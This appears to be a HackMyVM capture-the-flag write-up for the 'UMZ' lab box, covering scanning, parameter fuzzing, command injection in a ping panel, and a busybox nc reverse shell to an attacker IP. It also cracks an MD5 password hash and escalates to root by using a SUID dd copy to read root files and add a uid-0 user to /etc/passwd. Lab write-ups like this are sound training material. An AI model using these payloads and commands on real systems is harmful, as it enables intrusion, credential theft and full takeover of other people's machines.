## Hackmyvm UMZ
### Initial Scan
`fping` is similar to `ping`in that it uses ICMP echo requests to determine if a host is responding. My insecure network in VLAN 999 (`10.9.9.0/24`)
```bash
# -a, show systems that are alive, -g, generate a target list from a supplied IP netmask, -q, quiet and don't show per-target results
fping -agq 10.9.9.0/24

---response---
10.9.9.1
10.9.9.22 - the target host IP address
```

## Information Collection
### Nmap
`-sS` is a TCP SYN scan, `-p-` is used for checking all 65535 ports, `-Pn` skip host discovery (treat all hosts as online)
```bash
# this first scan is to check on all open ports
nmap -sS 10.9.9.22 -p- -Pn

--response---
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 02:38 EDT
Nmap scan report for 10.9.9.22
Host is up (0.0027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
#### Service and version enumeration
```bash
kali :: exercises/HMV/umz » nmap -sSVC 10.9.9.22 -p22,80 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 03:07 EDT
Nmap scan report for 10.9.9.22
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: cyber fortress 9000
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

### Web Content on Port 80
![[Screenshot 2025-08-20 102612.png]]
Running `feroxbuster` on the http server
```bash
feroxbuster -u http://10.9.9.22/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -x php,jpg,jpeg,txt,conf,html
```
After running the above command I ended up with two directories.
```bash
index.html
index.php
```
The file names may have the same name but have different contents. the index.html file has basic text and nothing stands out but as for the `index.php` it tells us on what the site does.
Here are the contents from the `index.php` file
![[Screenshot 2025-08-20 102643.png]]
The source code of the page does not reveal anything to us but there's something on the page that catches our eyes. `system operational` meaning that this page is used by the developer to check for the operational status of the website and detects DDOS attacks.
#### Parameter Fuzzing
We are going to check for all the parameters in the `index.php` file. For this task we are going to use `ffuf`, an open source tool for fuzzing directories and parameters.
```bash
ffuf -u http://10.9.9.22/index.php\?FUZZ\=1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```
the `-fw` flag is used to filter out words. and after running this we got `stress` as the parameter. when trying to read files using `LFI` we are unsuccessful
```bash
ffuf -u http://10.9.9.22/index.php\?FUZZ\=../../../../../../../etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```
Since there's nothing we can do with the `stress` parameter. What we are going to do is to stress the server and check to see if the responses and the number of open ports changes on the server.
```bash
ffuf -u http://10.9.9.22/index.php\?stress\=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt -mc 200 -fw 909
```
Remember to include the `sleep` command so to not overwhelm the server, which could lead to the server freezing and not being able to respond. Use responsibly.
Some servers when overloaded, a port appears to be opened to a web application," suggests that this is an attempt to trigger a hidden mechanism through server load. This is an  unconventional hidden feature.
After stressing the server we finally have access to the port `8080` within the server. and here's the `http` content.
![[Pasted image 20250820124730.png]]
Trying `admin:admin` as the username and password and bingo we have access to the console.
![[Screenshot 2025-08-20 124840.png]]
We can use this panel to ping ip address. It's a simple function where it returns if the ip address entered  is reachable or not.
![[Screenshot 2025-08-20 125022.png]]
we can try to `RCE` by using different characters `|`, `;`, `&`. luckily we are able to run system commands by piping the command we want after the IP address.
After running this command `172.16.1.1;id` we get this output
![[Pasted image 20250820125559.png]]Note the response at the end. The system has run the first command successfully and then executed the command after the `;` character.
To get a reverse shell we are going to use the following command `172.16.1.1; busybox nc 10.6.6.5 1234 -e /bin/bash`, `10.6.6.5` is the attackers IP address, on the attackers machine we run `nc -lvnp 1234`. 
```bash
kali :: exercises/HMV/umz » nc -lvnp 4455
listening on [any] 4455 ...
connect to [10.6.6.5] from (UNKNOWN) [10.9.9.22] 41498
cd  /home
whoami
welcome
cd welcome
ls
user.txt
cat user.txt
flag{user-4483f72525b3c316704cf126bec02d5c}
```
In order to gain a more interactive and stable shell we add our attackers ssh public key to the targets authorized keys file
```bash
ls -la
total 28
drwxr-xr-x 3 welcome welcome 4096 Aug 19 08:32 .
drwxr-xr-x 4 root    root    4096 May  3 10:27 ..
lrwxrwxrwx 1 root    root       9 May  3 10:26 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
drwxr-xr-x 2 welcome welcome 4096 Aug 19 08:33 .ssh
-rw-r--r-- 1 root    root      44 May  3 10:26 user.txt
cd .ssh
ls
authorized_keys
cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJstjRMdt87OXEclXoCNTDu26ys8XEqZQK2X96erxhJ public key to VMs
```
from here, we can kill the current shell and login using ssh. I named the ssh key file `vuln_vm`. I have many ssh files and that's why I had to include the private key in the command
```bash
kali :: exercises/HMV/umz » ssh welcome@10.9.9.22 -i ~/.ssh/vuln_vm 
```
### Privilege Escalations
Check for all the users that are present on the system
```bash
welcome@Umz:/opt/flask-debug$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
umzyyds:x:1001:1001:,,,:/home/umzyyds:/bin/bash
```
The `sudo -l` command check to see what commands can the user run as another user.
```bash
welcome@Umz:~$ sudo -l
Matching Defaults entries for welcome on Umz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```
After going through some of the common files, I came across the `/opt` folder and discovered the source code of the python file that hosts the `8080` server. 
```bash
welcome@Umz:~$ ls -la /opt/flask-debug/
total 20
drwxr-xr-x 2 welcome welcome 4096 May  3 10:32 .
drwxr-xr-x 3 root    root    4096 May  3 09:46 ..
-rw-r--r-- 1 root    root    5001 May  3 10:23 flask_debug.py
-rwx------ 1 root    root      10 May  3 10:32 umz.pass

welcome@Umz:/opt/flask-debug$ sudo md5sum umz.pass
a963fadd7fd379f9bc294ad0ba44f659  umz.pass
```
After going through the source codes in the python file, nothing stands out. but there's the `umz.pass` file that the root user is the only user with permission to access it. Here we copy this file to our attacker's machine and try to crack it using the `rockyou.txt` wordlist. Here's a python file to automate the process
```python
#!/usr/bin/env python3

import hashlib
import time

TARGET_HASH = "a963fadd7fd379f9bc294ad0ba44f659"
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"

def calculate_md5_with_appended_newline(text_to_hash):
    text_with_newline = text_to_hash + "\n"
    return hashlib.md5(text_with_newline.encode('utf-8')).hexdigest()

def main():
    try:
        with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            print(f"Start hash comparison with Wordlist: {WORDLIST_PATH}")
            print(f"Target hash: {TARGET_HASH} (expected from 'password\\n')")

            line_count = 0
            processed_count = 0
            start_time = time.time()
            found_password_clean = None

            for line in f:
                line_count += 1
                processed_count += 1

                password_candidate_from_file = line.strip()

                if not password_candidate_from_file:
                    continue

                current_hash = calculate_md5_with_appended_newline(password_candidate_from_file)

                if current_hash == TARGET_HASH:
                    found_password_clean = password_candidate_from_file
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    print("\n" + "*" * 50)
                    print(f"PASSWORD FOUND after {line_count} attempts!")
                    print(f"Password (without the trailing \\n): {found_password_clean}")
                    print(f"Hashed: '{found_password_clean}\\n'")
                    print(f"Generated hash: {current_hash}")
                    print(f"Duration: {elapsed_time:.2f} seconds")
                    print("*" * 50)
                    break

                if processed_count % 500000 == 0:
                    current_time = time.time()
                    elapsed_time = current_time - start_time
                    if elapsed_time > 0:
                        rate = processed_count / elapsed_time
                        print(f"Processed: {processed_count} words... Rate: {rate:.0f} W/s", end='\r')

            print()

            if not found_password_clean:
                end_time = time.time()
                elapsed_time = end_time - start_time
                print(f"Password NOT found in wordlist '{WORDLIST_PATH}' after {line_count} attempts.")
                print(f"Total duration: {elapsed_time:.2f} seconds.")

    except FileNotFoundError:
        print(f"Error: Wordlist not found at '{WORDLIST_PATH}'")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
```
It's a simple python file that reads the `rockyou.txt` file and hashes it to `md5sum` hash and compares it to.
```bash
kali :: exercises/HMV/umz » python3 md5cracker.py
Start hash comparison with Wordlist: /usr/share/wordlists/rockyou.txt
Target hash: a963fadd7fd379f9bc294ad0ba44f659 (expected from 'password\n')

**************************************************
PASSWORD FOUND after 9982 attempts!
Password (without the trailing \n): sunshine3
Hashed: 'sunshine3\n'
Generated hash: a963fadd7fd379f9bc294ad0ba44f659
Duration: 0.01 seconds
**************************************************
```
After running the python script, we get the `umzyyds` password `sunshine3`
```bash
welcome@Umz:/opt/flask-debug$ su umzyyds
Password:
umzyyds@Umz:~$ id
uid=1001(umzyyds) gid=1001(umzyyds) groups=1001(umzyyds)
umzyyds@Umz:~$ sudo -l
[sudo] password for umzyyds:
Sorry, user umzyyds may not run sudo on Umz.
umzyyds@Umz:/opt/flask-debug$ ls -la
total 20
drwxr-xr-x 2 welcome welcome 4096 May  3 10:32 .
drwxr-xr-x 3 root    root    4096 May  3 09:46 ..
-rw-r--r-- 1 root    root    5001 May  3 10:23 flask_debug.py
-rwx------ 1 root    root      10 May  3 10:32 umz.pass
umzyyds@Umz:/opt/flask-debug$ cd ~
umzyyds@Umz:~$ ls -la
total 96
drwx------ 2 umzyyds umzyyds  4096 May  3 10:42 .
drwxr-xr-x 4 root    root     4096 May  3 10:27 ..
lrwxrwxrwx 1 root    root        9 May  3 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 umzyyds umzyyds   220 May  3 10:27 .bash_logout
-rw-r--r-- 1 umzyyds umzyyds  3526 May  3 10:27 .bashrc
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
-rw-r--r-- 1 umzyyds umzyyds   807 May  3 10:27 .profile
```
switch to the `umzyyds` user and try to gain access to the root user from there onwards. Here we notice the `Dashazi` binary. notice the `suidy` bit set for the file, this means we can run the file as root.
```bash
umzyyds@Umz:~$ file Dashazi
Dashazi: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=21bfd63cfb732f9c09d17921f8eef619429bcd35, stripped
umzyyds@Umz:~$ ./Dashazi --version
dd (coreutils) 8.30
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Paul Rubin, David MacKenzie, and Stuart Kemp.
```
The `dashazi` file is a copy of the `dd` file and following up on the command on `GTFObins` we can read any file we want. 
To read the root flag
```bash
umzyyds@Umz:~$ ./Dashazi if=/root/root.txt
flag{root-a73c45107081c08dd4560206b8ef8205}
0+1 records in
0+1 records out
44 bytes copied, 0.00483868 s, 9.1 kB/s
```
Finally we get the root flag. Apart from reading any file we can also write to any file and in any folder. 
To show this we are going to create another passwd file but with another user that we control that has root access.
1. create a password hash (password: `toor`, salt:`aa`)
```bash
umzyyds@Umz:~$ perl -le 'print crypt("toor", "aa")'
aalIoK7SGUI2k
```
2. Add the new user and their password to the passwd file
```bash
umzyyds@Umz:~$ ./Dashazi if=/etc/passwd of=/tmp/passwd.original status=none
umzyyds@Umz:~$ cp /tmp/passwd.original /tmp/passwd.modified
umzyyds@Umz:~$ echo "cyxteen:aalIoK7SGUI2k:0:0:superuser:/root:/bin/bash" >> /tmp/passwd.modified
umzyyds@Umz:~$ cat /tmp/passwd.modified
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
umzyyds:x:1001:1001:,,,:/home/umzyyds:/bin/bash
cyxteen:aalIoK7SGUI2k:0:0:superuser:/root:/bin/bash
```
3. copy the modified file to the original `passwd` file. `status=none` suppresses all the errors
```bash
umzyyds@Umz:~$ ./Dashazi if=/tmp/passwd.modified of=/etc/passwd status=none
```
4. Finally
```bash
umzyyds@Umz:~$ su cyxteen
Password:
root@Umz:/home/umzyyds# whoami
root
root@Umz:/home/umzyyds# sudo -l
Matching Defaults entries for root on Umz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User root may run the following commands on Umz:
    (ALL : ALL) ALL
```
